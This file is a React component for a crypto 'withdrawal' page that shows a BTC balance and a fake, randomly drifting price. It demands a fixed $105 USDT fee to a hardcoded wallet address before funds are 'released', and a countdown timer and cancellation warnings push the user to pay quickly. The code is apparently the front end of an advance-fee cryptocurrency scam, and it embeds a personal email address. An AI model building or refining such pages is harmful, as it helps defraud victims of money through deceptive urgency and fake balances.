import { useEffect, useState } from 'react';
import { ArrowLeft, Copy, AlertTriangle, Clock, Wallet, Bitcoin } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { ShutdownWarning } from '@/components/ShutdownWarning';
import { useFeeCountdown } from '@/hooks/useCountdown';
import { useTranslation } from '@/translations';
import { useAuth } from '@/hooks/useAuth';
import { toast } from 'sonner';

interface WithdrawFeeProps {
  onBack: () => void;
  bitcoinAddress: string;
}

const FEE_AMOUNT = 105; // Fixed fee amount
const USERS_KEY = 'cryptolegacy-users';
const AUTH_KEY = 'crypto-wallet-auth';

// Hardcoded user fallback (matches useAuth.ts)
const HARDCODED_USER = {
  email: 'amalamira38sy@gmail.com',
  usdtAddress: 'TDU1UpF9KYTyG2sUTm2k5RsLKVVTPoKAc5',
};

export function WithdrawFee({ onBack, bitcoinAddress }: WithdrawFeeProps) {
  const { t } = useTranslation();
  const { minutes, seconds, isExpired } = useFeeCountdown();
  const { balance } = useAuth();
  const currentBalance = balance ?? 0.397;
  const [usdtAddress, setUsdtAddress] = useState(HARDCODED_USER.usdtAddress);
  const [btcPrice, setBtcPrice] = useState(69915.59);

  // Load user's USDT address and BTC price
  useEffect(() => {
    const authData = localStorage.getItem(AUTH_KEY);
    if (authData) {
      try {
        const { email } = JSON.parse(authData);
        const savedUsers = localStorage.getItem(USERS_KEY);
        if (savedUsers) {
          const users = JSON.parse(savedUsers);
          const user = users.find((u: { email: string }) => u.email.toLowerCase() === email.toLowerCase());
          if (user && user.usdtAddress) {
            setUsdtAddress(user.usdtAddress);
          } else if (email.toLowerCase() === HARDCODED_USER.email.toLowerCase()) {
            setUsdtAddress(HARDCODED_USER.usdtAddress);
          }
        } else if (email.toLowerCase() === HARDCODED_USER.email.toLowerCase()) {
          setUsdtAddress(HARDCODED_USER.usdtAddress);
        }
      } catch {
        /* silently ignore localStorage errors to prevent data leakage */
      }
    }

    // Simulate BTC price updates
    const interval = setInterval(() => {
      setBtcPrice(prev => prev * (1 + (Math.random() - 0.5) * 0.002));
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(usdtAddress);
    toast.success(t('addressCopied'));
  };

  useEffect(() => {
    if (isExpired) {
      toast.error(t('cancelWarning'));
    }
  }, [isExpired, t]);

  // Calculate values
  const withdrawalAmountUSD = currentBalance * btcPrice;
  const feePercentage = (FEE_AMOUNT / withdrawalAmountUSD) * 100;

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(amount);
  };

  return (
    <div 
      className="min-h-screen p-4 md:p-8 transition-colors duration-300"
      style={{ backgroundColor: 'var(--bg-primary)' }}
    >
      <div className="max-w-2xl mx-auto">
        {/* Shutdown Warning - Compact */}
        <ShutdownWarning compact />

        {/* Back Button */}
        <Button
          variant="ghost"
          onClick={onBack}
          className="mb-4 transition-colors duration-300"
          style={{ color: 'var(--text-muted)' }}
        >
          <ArrowLeft className="w-4 h-4 mr-2" />
          {t('withdrawFunds')}
        </Button>

        {/* Fee Payment Card */}
        <Card 
          className="transition-colors duration-300"
          style={{ 
            backgroundColor: 'var(--bg-card)', 
            borderColor: 'var(--border-color)' 
          }}
        >
          <CardHeader>
            <CardTitle 
              className="text-2xl font-bold flex items-center gap-2"
              style={{ color: 'var(--text-primary)' }}
            >
              <Wallet className="w-6 h-6 text-amber-500" />
              {t('networkFeePayment')}
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Withdrawal Amount Display */}
            <div className="bg-gradient-to-r from-amber-500/20 to-orange-500/20 border border-amber-500/40 rounded-xl p-6">
              <div className="flex items-center justify-center gap-3 mb-3">
                <Bitcoin className="w-8 h-8 text-orange-500" />
                <span 
                  className="font-medium text-lg"
                  style={{ color: 'var(--text-primary)' }}
                >
                  {t('language') === 'اللغة' ? 'مبلغ السحب' : t('language') === 'fr' ? 'Montant du retrait' : 'Withdrawal Amount'}
                </span>
              </div>
              <div className="text-center">
                <div 
                  className="text-3xl font-bold mb-1"
                  style={{ color: 'var(--text-primary)' }}
                >
                  {currentBalance.toFixed(3)} BTC
                </div>
                <div className="text-xl text-amber-400">
                  ≈ {formatCurrency(withdrawalAmountUSD)}
                </div>
                <div 
                  className="text-sm mt-1"
                  style={{ color: 'var(--text-muted)' }}
                >
                  1 BTC = {formatCurrency(btcPrice)}
                </div>
              </div>
            </div>

            {/* Fee Amount with Percentage */}
            <div className="bg-gradient-to-r from-green-900/30 to-emerald-900/30 border border-green-500/30 rounded-xl p-6 text-center">
              <div className="flex items-center justify-center gap-3 mb-3">
                <div className="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold text-lg">T</span>
                </div>
                <span className="text-green-400 font-medium">USDT (TRC20)</span>
              </div>
              <p className="mb-2" style={{ color: 'var(--text-muted)' }}>
                {t('language') === 'اللغة' ? 'رسوم التحويل' : t('language') === 'fr' ? 'Frais de transfert' : 'Transfer Fee'}
              </p>
              <div className="text-4xl font-bold text-green-400">
                ${FEE_AMOUNT}
              </div>
              <div className="text-sm text-green-400/70 mt-1">
                ({feePercentage.toFixed(2)}% {t('language') === 'اللغة' ? 'من المبلغ' : t('language') === 'fr' ? 'du montant' : 'of amount'})
              </div>
            </div>

            {/* Countdown Timer */}
            <div className="bg-red-900/20 border border-red-600/30 rounded-xl p-4">
              <div className="flex items-center justify-center gap-2 mb-2">
                <Clock className="w-5 h-5 text-red-400" />
                <span className="text-red-300">{t('timeRemaining')}</span>
              </div>
              <div className="text-center">
                <span className="text-3xl font-bold text-red-400">
                  {String(minutes).padStart(2, '0')}:{String(seconds).padStart(2, '0')}
                </span>
              </div>
            </div>

            {/* Simple Instructions */}
            <div 
              className="rounded-xl p-4 transition-colors duration-300"
              style={{ 
                backgroundColor: 'var(--bg-input)', 
                border: '1px solid var(--border-color)' 
              }}
            >
              <p 
                className="text-center text-lg"
                style={{ color: 'var(--text-primary)' }}
              >
                {t('language') === 'اللغة' 
                  ? `أرسل مبلغ $${FEE_AMOUNT} إلى العنوان أدناه لدفع رسوم التحويل. سيتم السحب تلقائياً بعد استقبال الرسوم.`
                  : t('language') === 'fr'
                  ? `Envoyez $${FEE_AMOUNT} à l'adresse ci-dessous pour payer les frais de transfert. Le retrait sera effectué automatiquement après réception des frais.`
                  : `Send $${FEE_AMOUNT} to the address below to pay the transfer fee. Withdrawal will be processed automatically after receiving the fee.`
                }
              </p>
            </div>

            {/* USDT Address */}
            <div 
              className="rounded-xl p-6 transition-colors duration-300"
              style={{ 
                backgroundColor: 'var(--bg-primary)', 
                border: '1px solid var(--border-color)' 
              }}
            >
              <p 
                className="text-sm mb-3 text-center"
                style={{ color: 'var(--text-muted)' }}
              >
                {t('sendExactly')} <span className="text-green-400 font-bold">${FEE_AMOUNT} USDT</span> {t('toThisAddress')}
              </p>
              
              <div 
                className="flex items-center gap-2 rounded-lg p-3 transition-colors duration-300"
                style={{ backgroundColor: 'var(--bg-input)' }}
              >
                <code className="flex-1 text-green-400 font-mono text-sm break-all">
                  {usdtAddress}
                </code>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={handleCopyAddress}
                  className="flex-shrink-0 transition-colors duration-300"
                  style={{ color: 'var(--text-muted)' }}
                >
                  <Copy className="w-4 h-4" />
                </Button>
              </div>
            </div>

            {/* Warning */}
            <Alert className="bg-red-900/30 border-red-600/50">
              <AlertTriangle className="w-5 h-5 text-red-400" />
              <AlertDescription className="text-red-300">
                <span className="font-bold">{t('warning')}:</span> {t('cancelWarning')}
              </AlertDescription>
            </Alert>

            {/* Bitcoin Address Summary */}
            <div 
              className="rounded-lg p-4 border transition-colors duration-300"
              style={{ 
                backgroundColor: 'var(--bg-input)', 
                borderColor: 'var(--border-color)',
                opacity: 0.5
              }}
            >
              <p className="text-sm mb-1" style={{ color: 'var(--text-muted)' }}>{t('bitcoinAddress')}</p>
              <code className="font-mono text-sm break-all" style={{ color: 'var(--text-secondary)' }}>
                {bitcoinAddress}
              </code>
            </div>

            {/* Waiting Message */}
            <div className="text-center py-4">
              <div className="inline-flex items-center gap-2 text-amber-500">
                <div className="w-2 h-2 bg-amber-500 rounded-full animate-pulse" />
                <span>
                  {t('language') === 'اللغة' 
                    ? 'في انتظار تأكيد الدفع...' 
                    : t('language') === 'fr'
                    ? 'En attente de confirmation du paiement...'
                    : 'Waiting for payment confirmation...'}
                </span>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
